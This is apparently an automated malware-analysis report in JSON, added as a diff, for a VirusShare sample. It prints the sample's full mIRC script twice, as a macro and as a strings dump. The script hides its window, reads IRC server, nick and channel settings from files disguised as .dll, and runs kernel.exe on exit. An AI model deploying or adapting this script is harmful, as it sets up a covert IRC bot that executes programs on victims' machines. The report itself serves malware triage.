@@ -1,0 +1,63 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "run": "May run an executable file or a system command"
+        },
+        "macro": "on 1:START:{\n  //.echo f\ufffdrat $dll(secret.dll, do_ShowWindow, $window(-2).hwnd 0)\n  nick $read nc.dll\n  username $read nc.dll\n  identd on $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)\n  emailaddr $read nc.dll\n  anick $read nc.dll\n  server $read nw.dll\n}\non 1:connect:{\n  join $read un.dll\n}\non 1:disconnect:{\n  nick $read nc.dll\n  username $read nc.dll\n  identd on $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)\n  emailaddr $read nc.dll\n  anick $read nc.dll\n  server $read nw.dll\n}\non *:ping:{ ctcp $me ping }\nraw 474:*:{ join $read un.dll }\nraw 433:*:{ nick $read nc.dll }\non 1:exit:{\nrun kernel.exe\n}"
+    },
+    "filename": "VirusShare_319ee60309b08f446fa284f194ffcdc7",
+    "filesize": 859,
+    "filetype": "ISO-8859 text, with CRLF line terminators",
+    "hashes": {
+        "md5": "319ee60309b08f446fa284f194ffcdc7",
+        "sha1": "d9030df61a1855b73f569ebd3733bf5aed78118c",
+        "sha256": "04295bf0ce84e29ea49f07d09603be4f6932491c4ac9c5e2194250ffc4a73c53"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "on 1:START:{",
+            "  //.echo frat $dll(secret.dll, do_ShowWindow, $window(-2).hwnd 0)",
+            "  nick $read nc.dll",
+            "  username $read nc.dll",
+            "  identd on $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)",
+            "  emailaddr $read nc.dll",
+            "  anick $read nc.dll",
+            "  server $read nw.dll",
+            "on 1:connect:{",
+            "  join $read un.dll",
+            "on 1:disconnect:{",
+            "  nick $read nc.dll",
+            "  username $read nc.dll",
+            "  identd on $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z)",
+            "  emailaddr $read nc.dll",
+            "  anick $read nc.dll",
+            "  server $read nw.dll",
+            "on *:ping:{ ctcp $me ping }",
+            "raw 474:*:{ join $read un.dll }",
+            "raw 433:*:{ nick $read nc.dll }",
+            "on 1:exit:{",
+            "run kernel.exe"
+        ],
+        "file": {
+            "  anick $read nc.dll": "Library",
+            "  emailaddr $read nc.dll": "Library",
+            "  join $read un.dll": "Library",
+            "  nick $read nc.dll": "Library",
+            "  server $read nw.dll": "Library",
+            "  username $read nc.dll": "Library",
+            "run kernel.exe": "Executable"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.265085",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
